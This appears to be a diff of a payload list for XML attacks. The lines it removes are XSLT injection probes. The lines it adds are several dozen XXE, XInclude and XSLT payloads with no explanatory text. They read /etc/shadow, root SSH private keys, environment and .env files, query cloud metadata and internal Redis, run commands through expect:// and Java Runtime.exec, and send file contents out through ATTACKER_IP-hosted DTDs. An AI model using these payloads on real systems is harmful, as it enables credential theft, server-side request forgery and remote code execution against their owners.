@@ -1,21 +1,41 @@
-<xsl:value-of select="system-property('xsl:vendor')"/>
-<xsl:value-of select="system-property('xsl:version')"/>
-<xsl:value-of select="system-property('xsl:vendor-url')"/>
-
-<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
-<xsl:value-of select="document('http://127.0.0.1:8080/admin')"/>
-<xsl:value-of select="document('file:///etc/passwd')"/>
-
-<xsl:value-of select="document('file:///etc/passwd')"/>
-<xsl:value-of select="document('file:///etc/shadow')"/>
-<xsl:value-of select="document('file:///var/www/html/.env')"/>
-
-<xsl:value-of select="//user[name='INJECT']"/>
-<xsl:value-of select="//user[name='' or '1'='1']"/>
-
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-<xsl:template match="/">
-  <xsl:value-of select="system-property('xsl:vendor')"/>
-</xsl:template>
-</xsl:stylesheet>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR_URL/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">%xxe;]><root></root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://localhost:6379/info">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><root>&xxe;</root>
+<!--<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>-->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0"?><root><![CDATA[<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>]]></root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % goodies SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><foo>&all;</foo>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY xxe2 SYSTEM "file:///etc/shadow">]><root>&xxe;&xxe2;</root>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://ATTACKER_IP/evil.dtd"><root></root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//OASIS//DTD DITA Reference//EN" "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><test><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></test>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:value-of select="java:java.lang.Runtime.exec('id')"/></xsl:template></xsl:stylesheet>
+<?xml-stylesheet type="text/xsl" href="file:///etc/passwd"?>
+<?xml-stylesheet type="text/xsl" href="http://ATTACKER_IP/evil.xsl"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://ATTACKER_IP/evil.dtd">
